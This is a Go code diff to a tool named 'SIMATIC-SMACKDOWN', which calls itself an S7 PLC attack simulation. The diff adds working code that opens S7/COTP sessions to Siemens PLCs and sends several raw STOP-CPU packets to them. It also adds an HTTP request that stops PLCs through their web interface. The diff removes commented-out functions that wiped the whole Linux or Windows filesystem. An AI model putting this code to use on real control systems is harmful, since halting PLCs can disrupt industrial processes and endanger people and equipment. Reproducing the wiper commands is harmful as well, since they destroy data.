@@ -6,6 +6,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	//"runtime"
 	"strings"
 	"time"
 )
@@ -82,18 +83,97 @@ func VerifyTargets(targets []string) []string {
 	return validTargets
 }
 
-// KillIP sends a stop command to the devices at the scanned IPs.
-func KillIP(scannedIPs []string) {
-	fmt.Printf("\n[*] Initiating S7 protocol STOP CPU attack...\n")
-	stop := "\x03\x00\x00\x25\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x14\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
-	for _, ip := range scannedIPs {
-		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
-			fmt.Printf("[!] Sending STOP command to PLC at %s via S7 protocol\n", ip)
-			_, _ = conn.Write([]byte(stop))
-			_ = conn.Close()
-		} else {
-			fmt.Printf("[-] Failed to connect to %s: %v\n", ip, err)
+// EstablishS7Connection sets up proper COTP/S7 connection
+func EstablishS7Connection(ip string) (net.Conn, error) {
+	conn, err := net.DialTimeout("tcp", ip+":102", 2*time.Second)
+	if err != nil {
+		return nil, err
+	}
+
+	// COTP Connection Request
+	cotpConnect := []byte{
+		0x03, 0x00, 0x00, 0x16, 0x11, 0xe0, 0x00, 0x00,
+		0x00, 0x01, 0x00, 0xc0, 0x01, 0x0a, 0xc1, 0x02,
+		0x01, 0x00, 0xc2, 0x02, 0x01, 0x00,
+	}
+
+	_, err = conn.Write(cotpConnect)
+	if err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	// Read COTP response
+	buffer := make([]byte, 256)
+	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+	n, err := conn.Read(buffer)
+
+	if err == nil && n > 5 && buffer[5] == 0xD0 {
+		// COTP connected, now setup S7
+		s7Setup := []byte{
+			0x03, 0x00, 0x00, 0x19, 0x02, 0xf0, 0x80, 0x32,
+			0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x08, 0x00,
+			0x00, 0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0,
 		}
+
+		_, err = conn.Write(s7Setup)
+		if err == nil {
+			conn.Read(buffer) // Read S7 response
+		}
+	}
+
+	return conn, nil
+}
+
+// EnhancedKillIP sends STOP commands with S7-1200 support
+func EnhancedKillIP(scannedIPs []string) {
+	fmt.Printf("\n[*] Initiating enhanced S7 protocol STOP CPU attack...\n")
+
+	// Multiple STOP command variants for different PLC models
+	stopCommands := []struct {
+		name    string
+		command []byte
+	}{
+		{
+			"S7-1200 STOP (Function 0x28)",
+			[]byte{0x03, 0x00, 0x00, 0x25, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d},
+		},
+		{
+			"Standard STOP (Function 0x29)",
+			[]byte{0x03, 0x00, 0x00, 0x21, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x06, 0x00, 0x00, 0x10, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d},
+		},
+		{
+			"Minimal STOP",
+			[]byte{0x03, 0x00, 0x00, 0x19, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00},
+		},
+	}
+
+	for _, ip := range scannedIPs {
+		fmt.Printf("\n[*] Attacking PLC at %s\n", ip)
+
+		// First try with proper connection setup
+		conn, err := EstablishS7Connection(ip)
+		if err != nil {
+			fmt.Printf("[-] Failed to establish S7 connection: %v\n", err)
+			// Try raw connection
+			conn, err = net.Dial("tcp", ip+":102")
+			if err != nil {
+				fmt.Printf("[-] Failed to connect to %s\n", ip)
+				continue
+			}
+		}
+
+		// Try each STOP command
+		for _, cmd := range stopCommands {
+			fmt.Printf("[!] Sending %s\n", cmd.name)
+			_, err := conn.Write(cmd.command)
+			if err != nil {
+				fmt.Printf("[-] Failed to send: %v\n", err)
+			}
+			time.Sleep(200 * time.Millisecond)
+		}
+
+		conn.Close()
 	}
 	fmt.Printf("[*] S7 protocol attack phase complete\n")
 }
@@ -101,21 +181,30 @@ func KillIP(scannedIPs []string) {
 // KillHTTP sends a stop command via HTTP to the devices at the scanned IPs.
 func KillHTTP(scannedIPs []string) {
 	fmt.Printf("\n[*] Initiating HTTP web interface STOP attack...\n")
-	client := &http.Client{}
+	client := &http.Client{Timeout: 5 * time.Second}
+
 	for _, ip := range scannedIPs {
-		data := strings.NewReader(`Run=1&PriNav=Stop`)
-		req, err := http.NewRequest("POST", "http://"+ip+"/CPUCommands", data)
-		if err != nil {
-			fmt.Printf("[-] Failed to create HTTP request for %s: %v\n", ip, err)
-			continue
+		// Try both HTTP and HTTPS
+		urls := []string{
+			"http://" + ip + "/CPUCommands",
 		}
-		fmt.Printf("[!] Sending STOP command to PLC at %s via HTTP interface\n", ip)
-		setHTTPHeaders(req, ip)
-		if resp, err := client.Do(req); err != nil {
-			fmt.Printf("[-] HTTP request failed for %s: %v\n", ip, err)
-		} else {
-			fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
-			_ = resp.Body.Close()
+
+		for _, url := range urls {
+			data := strings.NewReader(`Stop=1&PriNav=Start`)
+			req, err := http.NewRequest("POST", url, data)
+			if err != nil {
+				continue
+			}
+
+			fmt.Printf("[!] Sending STOP command to PLC at %s via %s\n", ip, url[:5])
+			setHTTPHeaders(req, ip)
+
+			if resp, err := client.Do(req); err != nil {
+				fmt.Printf("[-] HTTP request failed for %s: %v\n", url, err)
+			} else {
+				fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
+				_ = resp.Body.Close()
+			}
 		}
 	}
 	fmt.Printf("[*] HTTP attack phase complete\n")
@@ -138,22 +227,6 @@ func setHTTPHeaders(req *http.Request, ip string) {
 	req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
 }
 
-// KillLinux deletes files on Linux systems if the user has sufficient privileges.
-// func KillLinux() {
-// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Linux filesystem...")
-// 	if err := os.RemoveAll("/"); err != nil {
-// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
-// 	}
-// }
-
-// KillWindows deletes files on Windows systems if the user has sufficient privileges.
-// func KillWindows() {
-// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Windows filesystem...")
-// 	if err := os.RemoveAll("C:\\"); err != nil {
-// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
-// 	}
-// }
-
 // ValidateIP checks if a string is a valid IP address
 func ValidateIP(ip string) bool {
 	return net.ParseIP(ip) != nil
@@ -161,6 +234,7 @@ func ValidateIP(ip string) bool {
 
 func main() {
 	fmt.Println("=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===")
+	fmt.Println("[*] Enhanced version with S7-1200 support")
 
 	var targets []string
 
@@ -214,20 +288,15 @@ func main() {
 		}
 	}
 
-	// Attack the targets
+	// Attack the targets with enhanced S7-1200 support
 	fmt.Printf("\n[*] Proceeding with attack on %d target(s)\n", len(targets))
-	KillIP(targets)
+	EnhancedKillIP(targets)
 	KillHTTP(targets)
-
-	// switch runtime.GOOS {
-	// case "linux":
-	// 	fmt.Printf("[!] Detected Linux OS - Destructive payload available but disabled\n")
-	// 	// KillLinux()
-	// case "windows":
-	// 	fmt.Printf("[!] Detected Windows OS - Destructive payload available but disabled\n")
-	// 	// KillWindows()
-	// }
 
 	fmt.Println("\n[*] Attack simulation complete.")
 	fmt.Printf("[*] Targeted %d PLCs in total\n", len(targets))
+	fmt.Println("\n[!] Check PLC status:")
+	fmt.Println("    - RUN/STOP LED on the PLC")
+	fmt.Println("    - TIA Portal connection status")
+	fmt.Println("    - Web interface (if available)")
 }
